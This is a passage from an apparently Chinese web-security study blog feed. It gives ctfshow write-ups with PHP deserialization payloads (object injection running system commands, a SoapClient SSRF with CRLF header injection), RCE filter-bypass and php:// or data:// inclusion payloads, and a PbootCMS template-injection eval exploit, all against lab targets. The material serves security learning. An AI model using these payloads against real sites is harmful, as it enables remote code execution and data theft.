title="254-对象引用执行逻辑"></a>254-对象引用执行逻辑</h5><p>username&#x3D;xxxxxx&amp;password&#x3D;xxxxxx</p><h5 id="255-反序列化变量修改1"><a href="#255-反序列化变量修改1" class="headerlink" title="255-反序列化变量修改1"></a>255-反序列化变量修改1</h5><p>Code:</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="variable">$isVip</span>=<span class="literal">true</span>;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title function_ invoke__">ctfShowUser</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br></pre></td></tr></table></figure><p>Get:username&#x3D;xxxxxx&amp;password&#x3D;xxxxxx</p><p>Cookie:user&#x3D;O%3A11%3A%22ctfShowUser%22%3A3%3A%7Bs%3A8%3A%22username%22%3Bs%3A6%3A%22xxxxxx%22%3Bs%3A8%3A%22password%22%3Bs%3A6%3A%22xxxxxx%22%3Bs%3A5%3A%22isVip%22%3Bb%3A1%3B%7D</p><h4 id="256-反序列化参数修改2"><a href="#256-反序列化参数修改2" class="headerlink" title="256-反序列化参数修改2"></a>256-反序列化参数修改2</h4><p>CODE:</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="variable">$username</span>=<span class="string">&#x27;x&#x27;</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$password</span>=<span class="string">&#x27;y&#x27;</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$isVip</span>=<span class="literal">true</span>;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title function_ invoke__">ctfShowUser</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br></pre></td></tr></table></figure><p>GET:username&#x3D;x&amp;password&#x3D;y</p><p>COOKIE:user&#x3D;O%3A11%3A%22ctfShowUser%22%3A3%3A%7Bs%3A8%3A%22username%22%3Bs%3A1%3A%22x%22%3Bs%3A8%3A%22password%22%3Bs%3A1%3A%22y%22%3Bs%3A5%3A%22isVip%22%3Bb%3A1%3B%7D</p><h5 id="257-反序列化参数修改-amp-对象调用逻辑"><a href="#257-反序列化参数修改-amp-对象调用逻辑" class="headerlink" title="257-反序列化参数修改&amp;对象调用逻辑"></a>257-反序列化参数修改&amp;对象调用逻辑</h5><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfShowUser</span></span>&#123;</span><br><span class="line">​    <span class="keyword">private</span> <span class="variable">$class</span>;</span><br><span class="line">​    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">​        <span class="variable language_">$this</span>-&gt;<span class="class"><span class="keyword">class</span>=<span class="title">new</span> <span class="title">backDoor</span>();</span></span><br><span class="line"><span class="class">​    &#125;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">&#125;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class"><span class="title">class</span> <span class="title">backDoor</span></span>&#123;</span><br><span class="line">​    <span class="keyword">private</span> <span class="variable">$code</span>=<span class="string">&#x27;system(&quot;cat f*&quot;);&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$b</span>=<span class="keyword">new</span> <span class="title function_ invoke__">ctfShowUser</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$b</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>GET：username&#x3D;xxxxxx&amp;password&#x3D;xxxxxx</p><p>COOKIE：user&#x3D;O%3A11%3A%22ctfShowUser%22%3A1%3A%7Bs%3A18%3A%22%00ctfShowUser%00class%22%3BO%3A8%3A%22backDoor%22%3A1%3A%7Bs%3A14%3A%22%00backDoor%00code%22%3Bs%3A17%3A%22system%28%22cat+f%2A%22%29%3B%22%3B%7D%7D</p><h5 id="258-反序列化参数修改-amp-对象调用逻辑"><a href="#258-反序列化参数修改-amp-对象调用逻辑" class="headerlink" title="258-反序列化参数修改&amp;对象调用逻辑"></a>258-反序列化参数修改&amp;对象调用逻辑</h5><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfShowUser</span></span>&#123;</span><br><span class="line">​    <span class="keyword">public</span> <span class="variable">$class</span> = <span class="string">&#x27;backDoor&#x27;</span>;</span><br><span class="line">​    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">​        <span class="variable language_">$this</span>-&gt;<span class="class"><span class="keyword">class</span>=<span class="title">new</span> <span class="title">backDoor</span>();</span></span><br><span class="line"><span class="class">​    &#125;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">&#125;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class"><span class="title">class</span> <span class="title">backDoor</span></span>&#123;</span><br><span class="line">​    <span class="keyword">public</span> <span class="variable">$code</span>=<span class="string">&quot;system(&#x27;cat flag.php&#x27;);&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title function_ invoke__">ctfShowUser</span>());</span><br><span class="line"><span class="variable">$b</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;:11&#x27;</span>,<span class="string">&#x27;:+11&#x27;</span>,<span class="variable">$a</span>);</span><br><span class="line"><span class="variable">$c</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;:8&#x27;</span>,<span class="string">&#x27;:+8&#x27;</span>,<span class="variable">$b</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="variable">$c</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>GET：username&#x3D;xxxxxx&amp;password&#x3D;xxxxxx</p><p>COOKIE：user&#x3D;O%3A%2B11%3A%22ctfShowUser%22%3A1%3A%7Bs%3A5%3A%22class%22%3BO%3A%2B8%3A%22backDoor%22%3A1%3A%7Bs%3A4%3A%22code%22%3Bs%3A23%3A%22system%28%27cat+flag.php%27%29%3B%22%3B%7D%7D</p><h5 id="259-原生态类-amp-call魔术方法-amp-配合SSRF"><a href="#259-原生态类-amp-call魔术方法-amp-配合SSRF" class="headerlink" title="259-原生态类&amp;call魔术方法&amp;配合SSRF"></a>259-原生态类&amp;call魔术方法&amp;配合SSRF</h5><p>参考：<a href="https://dar1in9s.github.io/2020/04/02/php%E5%8E%9F%E7%94%9F%E7%B1%BB%E7%9A%84%E5%88%A9%E7%94%A8/#Exception">https://dar1in9s.github.io/2020/04/02/php%E5%8E%9F%E7%94%9F%E7%B1%BB%E7%9A%84%E5%88%A9%E7%94%A8/#Exception</a></p><p>生成序列化时记得开启SoapClient拓展：php.ini中启用php_soap.dll</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$target</span> = <span class="string">&#x27;http://127.0.0.1/flag.php&#x27;</span>;</span><br><span class="line"><span class="variable">$post_string</span> = <span class="string">&#x27;token=ctfshow&#x27;</span>;</span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> <span class="title class_">SoapClient</span>(<span class="literal">null</span>,<span class="keyword">array</span>(<span class="string">&#x27;location&#x27;</span> =&gt; <span class="variable">$target</span>,<span class="string">&#x27;user_agent&#x27;</span>=&gt;<span class="string">&#x27;wupco^^X-Forwarded-For:127.0.0.1,127.0.0.1^^Content-Type: application/x-www-form-urlencoded&#x27;</span>.<span class="string">&#x27;^^Content-Length: &#x27;</span>.(<span class="keyword">string</span>)<span class="title function_ invoke__">strlen</span>(<span class="variable">$post_string</span>).<span class="string">&#x27;^^^^&#x27;</span>.<span class="variable">$post_string</span>,<span class="string">&#x27;uri&#x27;</span>=&gt; <span class="string">&quot;ssrf&quot;</span>));</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$b</span>);</span><br><span class="line"><span class="variable">$a</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;^^&#x27;</span>,<span class="string">&quot;\r\n&quot;</span>,<span class="variable">$a</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="variable">$a</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">vip=O%<span class="number">3</span>A10%<span class="number">3</span>A%<span class="number">22</span>SoapClient%<span class="number">22</span>%<span class="number">3</span>A4%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A3%<span class="number">3</span>A%<span class="number">22</span>uri%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A4%<span class="number">3</span>A%<span class="number">22</span>ssrf%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A8%<span class="number">3</span>A%<span class="number">22</span>location%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A25%<span class="number">3</span>A%<span class="number">22</span>http%<span class="number">3</span>A%<span class="number">2</span>F%<span class="number">2</span>F127.<span class="number">0.0</span>.<span class="number">1</span>%<span class="number">2</span>Fflag.php%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A11%<span class="number">3</span>A%<span class="number">22</span>_user_agent%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A128%<span class="number">3</span>A%<span class="number">22</span>wupco%<span class="number">0</span>D%<span class="number">0</span>AX-Forwarded-For%<span class="number">3</span>A127.<span class="number">0.0</span>.<span class="number">1</span>%<span class="number">2</span>C127.<span class="number">0.0</span>.<span class="number">1</span>%<span class="number">0</span>D%<span class="number">0</span>AContent-Type%<span class="number">3</span>A+application%<span class="number">2</span>Fx-www-form-urlencoded%<span class="number">0</span>D%<span class="number">0</span>AContent-Length%<span class="number">3</span>A+<span class="number">13</span>%<span class="number">0</span>D%<span class="number">0</span>A%<span class="number">0</span>D%<span class="number">0</span>Atoken%<span class="number">3</span>Dctfshow%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A13%<span class="number">3</span>A%<span class="number">22</span>_soap_version%<span class="number">22</span>%<span class="number">3</span>Bi%<span class="number">3</span>A1%<span class="number">3</span>B%<span class="number">7</span>D</span><br></pre></td></tr></table></figure><h5 id="260-字符串序列化"><a href="#260-字符串序列化" class="headerlink" title="260-字符串序列化"></a>260-字符串序列化</h5><p>ctfshow&#x3D;ctfshow_i_love_36D</p><h4 id="CMS代码审计-Typecho反序列化-amp-魔术方法逻辑"><a href="#CMS代码审计-Typecho反序列化-amp-魔术方法逻辑" class="headerlink" title="#CMS代码审计-Typecho反序列化&amp;魔术方法逻辑"></a>#CMS代码审计-Typecho反序列化&amp;魔术方法逻辑</h4><p><a href="https://www.anquanke.com/post/id/155306">https://www.anquanke.com/post/id/155306</a></p><p>搜反序列化关键字：unserialize</p>]]></content>
      
      
      <categories>
          
          <category> Web攻防 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Day44 WEB攻防-通用漏洞&amp;RCE&amp;代码执行&amp;命令执行&amp;多层面检测利用</title>
      <link href="/2023/01/31/Day44-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-RCE-%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-%E5%A4%9A%E5%B1%82%E9%9D%A2%E6%A3%80%E6%B5%8B%E5%88%A9%E7%94%A8/"/>
      <url>/2023/01/31/Day44-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-RCE-%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-%E5%A4%9A%E5%B1%82%E9%9D%A2%E6%A3%80%E6%B5%8B%E5%88%A9%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<h3 id="知识点："><a href="#知识点：" class="headerlink" title="#知识点："></a>#知识点：</h3><p>1、RCE执行-代码执行&amp;命令执行</p><p>2、CTF考点-漏洞配合&amp;绕过手法</p><p>3、利用审计-CMS框架&amp;中间件等</p><h3 id="详细点："><a href="#详细点：" class="headerlink" title="#详细点："></a>#详细点：</h3><p>1.为什么会产生此类安全问题</p><p>2.此类安全问题探针利用及危害</p><p>3.此类安全问题在CTF即CMS分析</p><p>漏洞场景：代码会调用自身的脚本代码执行，也会调用系统命令执行</p><p>漏洞区别：脚本语言&amp;操作系统(php&#x2F;java&#x2F;python&#x2F;js&amp;windows&#x2F;linux&#x2F;mac)</p><p>漏洞对象：WEB源码&amp;中间件&amp;其他环境（见漏洞详情对象）</p><p>漏洞危害：直接权限丢失,可执行任意脚本代码或系统命令</p><h3 id="演示案例："><a href="#演示案例：" class="headerlink" title="演示案例："></a>演示案例：</h3><p>➢ RCE-原理&amp;探针&amp;利用&amp;危害等</p><p>➢ CTF-29~39-RCE代码命令执行</p><p>➢ CMS-PbootCMS审计-RCE执行</p><p>➢ 层面-探针-语言&amp;CMS&amp;中间件等</p><h2 id="复现："><a href="#复现：" class="headerlink" title="复现："></a>复现：</h2><h4 id="RCE-原理-amp-探针-amp-利用-amp-危害等"><a href="#RCE-原理-amp-探针-amp-利用-amp-危害等" class="headerlink" title="#RCE-原理&amp;探针&amp;利用&amp;危害等"></a>#RCE-原理&amp;探针&amp;利用&amp;危害等</h4><p>举例:</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//eval代码执行</span></span><br><span class="line"><span class="keyword">eval</span>(<span class="string">&#x27;phpinfo();&#x27;</span>);</span><br><span class="line"><span class="comment">//system命令执行,调用系统的命令执行</span></span><br><span class="line"><span class="title function_ invoke__">system</span>(<span class="string">&#x27;ipconfig&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>-RCE代码执行：引用脚本代码解析执行</p><p>-RCE命令执行：脚本调用操作系统命令</p><p>漏洞函数：</p><p>1.PHP：</p><p>eval()、assert()、preg_replace()、call_user_func()、call_user_func_array()以及array_map()等</p><p>system、shell_exec、popen、passthru、proc_open等</p><p>2.Python：</p><p>eval exec subprocess os.system commands </p><p>3.Java：</p><p>Java中没有类似php中eval函数这种直接可以将字符串转化为代码执行的函数，</p><p>但是有反射机制，并且有各种基于反射机制的表达式引擎，如: OGNL、SpEL、MVEL等.</p><h4 id="CTF-29-39-RCE代码命令执行"><a href="#CTF-29-39-RCE代码命令执行" class="headerlink" title="#CTF-29~39-RCE代码命令执行"></a>#CTF-29~39-RCE代码命令执行</h4><h6 id="29-通配符"><a href="#29-通配符" class="headerlink" title="29-通配符"></a>29-通配符</h6><p><img src="/../images/Day44-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-RCE-%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-%E5%A4%9A%E5%B1%82%E9%9D%A2%E6%A3%80%E6%B5%8B%E5%88%A9%E7%94%A8/image-20230201181934956.png" alt="image-20230201181934956"></p><p>system(‘tac fla*.php’);</p><p><img src="/../images/Day44-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-RCE-%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-%E5%A4%9A%E5%B1%82%E9%9D%A2%E6%A3%80%E6%B5%8B%E5%88%A9%E7%94%A8/image-20230201181750045.png" alt="image-20230201181750045"></p><h6 id="30-取代函数-amp-通配符-amp-管道符"><a href="#30-取代函数-amp-通配符-amp-管道符" class="headerlink" title="30-取代函数&amp;通配符&amp;管道符"></a>30-取代函数&amp;通配符&amp;管道符</h6><p><img src="/../images/Day44-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-RCE-%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-%E5%A4%9A%E5%B1%82%E9%9D%A2%E6%A3%80%E6%B5%8B%E5%88%A9%E7%94%A8/image-20230201182052825.png" alt="image-20230201182052825"></p><p>解法一：echo shell_exec(‘tac fla*.ph*’);</p><p><img src="/../images/Day44-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-RCE-%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-%E5%A4%9A%E5%B1%82%E9%9D%A2%E6%A3%80%E6%B5%8B%E5%88%A9%E7%94%A8/image-20230201182235961.png" alt="image-20230201182235961"></p><p>解法二：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">`cp fla*.ph* 2.txt`</span><br></pre></td></tr></table></figure><p>(把flag.php复制到2.txt，再访问2.txt同样效果)</p><h6 id="31-参数逃逸"><a href="#31-参数逃逸" class="headerlink" title="31-参数逃逸"></a>31-参数逃逸</h6><p><img src="/../images/Day44-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-RCE-%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-%E5%A4%9A%E5%B1%82%E9%9D%A2%E6%A3%80%E6%B5%8B%E5%88%A9%E7%94%A8/image-20230201182847606.png" alt="image-20230201182847606"></p><p>eval($_GET[1]);&amp;1&#x3D;system(‘tac flag.php’);&#x2F;&#x2F;构建一个新的参数逃逸过滤</p><p><img src="/../images/Day44-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-RCE-%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-%E5%A4%9A%E5%B1%82%E9%9D%A2%E6%A3%80%E6%B5%8B%E5%88%A9%E7%94%A8/image-20230201183039977.png" alt="image-20230201183039977"></p><h6 id="32-36-配合包含-amp-伪协议"><a href="#32-36-配合包含-amp-伪协议" class="headerlink" title="32~36-配合包含&amp;伪协议"></a>32~36-配合包含&amp;伪协议</h6><p><img src="/../images/Day44-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-RCE-%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-%E5%A4%9A%E5%B1%82%E9%9D%A2%E6%A3%80%E6%B5%8B%E5%88%A9%E7%94%A8/image-20230201183152369.png" alt="image-20230201183152369"></p><p>include$_GET[a]?&gt;&amp;a&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,<code>&lt;?=system(&#39;tac flag.php&#39;);?&gt;</code></p><p><img src="/../images/Day44-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-RCE-%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-%E5%A4%9A%E5%B1%82%E9%9D%A2%E6%A3%80%E6%B5%8B%E5%88%A9%E7%94%A8/image-20230201183527298.png" alt="image-20230201183527298"></p><p>用php协议:include$_GET[a]?&gt;&amp;a&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php</p><p><img src="/../images/Day44-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-RCE-%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-%E5%A4%9A%E5%B1%82%E9%9D%A2%E6%A3%80%E6%B5%8B%E5%88%A9%E7%94%A8/image-20230201183952839.png" alt="image-20230201183952839"></p><h6 id="37-39-包含-amp-伪协议-amp-通配符"><a href="#37-39-包含-amp-伪协议-amp-通配符" class="headerlink" title="37~39-包含&amp;伪协议&amp;通配符"></a>37~39-包含&amp;伪协议&amp;通配符</h6><p><img src="/../images/Day44-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-RCE-%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-%E5%A4%9A%E5%B1%82%E9%9D%A2%E6%A3%80%E6%B5%8B%E5%88%A9%E7%94%A8/image-20230201184217562.png" alt="image-20230201184217562"></p><p>data:&#x2F;&#x2F;text&#x2F;plain,<code>&lt;?=system(&#39;tac fla*&#39;);?&gt;</code></p><p><img src="/../images/Day44-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-RCE-%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-%E5%A4%9A%E5%B1%82%E9%9D%A2%E6%A3%80%E6%B5%8B%E5%88%A9%E7%94%A8/image-20230201184358529.png" alt="image-20230201184358529"></p><p>php:&#x2F;&#x2F;input post:<code>&lt;?php system(&#39;tac flag.php&#39;);?&gt;</code></p><h4 id="代码审计-PbootCMS-RCE代码执行"><a href="#代码审计-PbootCMS-RCE代码执行" class="headerlink" title="#代码审计-PbootCMS-RCE代码执行"></a>#代码审计-PbootCMS-RCE代码执行</h4><blockquote><p>靶场：PbootCMS</p><p>流程：搜索特定函数-&gt;parserIfLabel-&gt;parserCommom-&gt;About&amp;Content-&gt;构造</p><p>AboutController：{pboot:if(eval($_POST[1]))}!!!{&#x2F;pboot:if}</p><p>ContentController：&#x2F;index.php&#x2F;Content&#x2F;2?keyword&#x3D;{pboot:if(eval($_REQUEST[1]));&#x2F;&#x2F;)})}}{&#x2F;pboot:if}&amp;1&#x3D;phpinfo();</p></blockquote><p>这个漏洞目前找到5处，新版本和老版本不同的是新版本加了过滤，但是可以绕过，漏洞函数在ParserController.php里。在2330多行这里，parserIfLabel()方法中调用了eval函数。而且前面有过滤。先忽略过滤内容，一会回来看，看下哪里调用了parserfLabel方法。</p><p>找到了parserIfLabel()方法，而且从下面可以看到在ParserController.php中parserAfter()方法调用了parserIfLabel()方法。</p><p><img src="/../images/Day44-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-RCE-%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-%E5%A4%9A%E5%B1%82%E9%9D%A2%E6%A3%80%E6%B5%8B%E5%88%A9%E7%94%A8/v2-68fa290adfcb378cae6cb3153e294e11_r.jpg" alt="img"></p><p>打开，找到函数右键全文追踪：</p><p><img src="/../images/Day44-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-RCE-%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-%E5%A4%9A%E5%B1%82%E9%9D%A2%E6%A3%80%E6%B5%8B%E5%88%A9%E7%94%A8/image-20230202160332177.png" alt="image-20230202160332177"></p><p>找到调用parserIflabel()的是parserCommon()方法:</p><p><img src="/../images/Day44-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-RCE-%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-%E5%A4%9A%E5%B1%82%E9%9D%A2%E6%A3%80%E6%B5%8B%E5%88%A9%E7%94%A8/image-20230202161230831.png" alt="image-20230202161230831"></p><p>所以谁调用了parserCommon()，谁就会触发parserIflabel()，全局搜索parserCommon()被谁调用,搜索后发现五处:（举例3处）</p><p><img src="/../images/Day44-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-RCE-%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-%E5%A4%9A%E5%B1%82%E9%9D%A2%E6%A3%80%E6%B5%8B%E5%88%A9%E7%94%A8/image-20230202161505479.png" alt="image-20230202161505479"></p><p><strong>1、index处：</strong></p><p>验证下是否可以控制前端输出，以Index试一下，可以看到已经可以控制前端输出，说明存在漏洞:</p><p><img src="/../images/Day44-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-RCE-%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-%E5%A4%9A%E5%B1%82%E9%9D%A2%E6%A3%80%E6%B5%8B%E5%88%A9%E7%94%A8/v2-529c75a220fb17244f12f9259f995222_1440w.webp" alt="img"></p><p>构造payload：</p><p><a href="http://127.0.0.1/PbootCMS/index.php/index/index?keyword=%7Bpboot:if(1)$a=$_GET%5Bb%5D;$a();;//)%7D)%7D%7D%7B/pboot:if%7D&b=phpinfo()">http://127.0.0.1/PbootCMS/index.php/index/index?keyword={pboot:if(1)$a=$_GET[b];$a();;//)})}}{/pboot:if}&amp;b=phpinfo()</a>;</p><p><img src="/../images/Day44-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-RCE-%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-%E5%A4%9A%E5%B1%82%E9%9D%A2%E6%A3%80%E6%B5%8B%E5%88%A9%E7%94%A8/image-20230202162413935.png" alt="image-20230202162413935"></p><p><strong>2、about留言处：（需要后台审核）</strong></p><p><img src="/../images/Day44-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-RCE-%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-%E5%A4%9A%E5%B1%82%E9%9D%A2%E6%A3%80%E6%B5%8B%E5%88%A9%E7%94%A8/image-20230202163621935.png" alt="image-20230202163621935"></p><p>将代码echo出来</p><p><img src="/../images/Day44-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-RCE-%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-%E5%A4%9A%E5%B1%82%E9%9D%A2%E6%A3%80%E6%B5%8B%E5%88%A9%E7%94%A8/image-20230202163759128.png" alt="image-20230202163759128"></p><p>显示变量1可控</p><p><img src="/../images/Day44-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-RCE-%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-%E5%A4%9A%E5%B1%82%E9%9D%A2%E6%A3%80%E6%B5%8B%E5%88%A9%E7%94%A8/image-20230202163650254.png" alt="image-20230202163650254"></p><p>然后</p><p><img src="/../images/Day44-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-RCE-%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-%E5%A4%9A%E5%B1%82%E9%9D%A2%E6%A3%80%E6%B5%8B%E5%88%A9%E7%94%A8/image-20230202163913648.png" alt="image-20230202163913648"></p><p><strong>3、content处：</strong></p><p><img src="/../images/Day44-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-RCE-%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-%E5%A4%9A%E5%B1%82%E9%9D%A2%E6%A3%80%E6%B5%8B%E5%88%A9%E7%94%A8/image-20230202165246027.png" alt="image-20230202165246027"></p><h4 id="层面-探针-语言-amp-CMS框架-amp-中间件"><a href="#层面-探针-语言-amp-CMS框架-amp-中间件" class="headerlink" title="#层面-探针-语言&amp;CMS框架&amp;中间件"></a>#层面-探针-语言&amp;CMS框架&amp;中间件</h4><p><a href="http://vulfocus.io/">http://vulfocus.io/ </a> Shiro weblogic</p>]]></content>
      
      
      <categories>
          
          <category> Web攻防 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Day43 WEB攻防-通用漏洞&amp;任意文件下载&amp;删除重装&amp;敏感读取&amp;黑白审计</title>
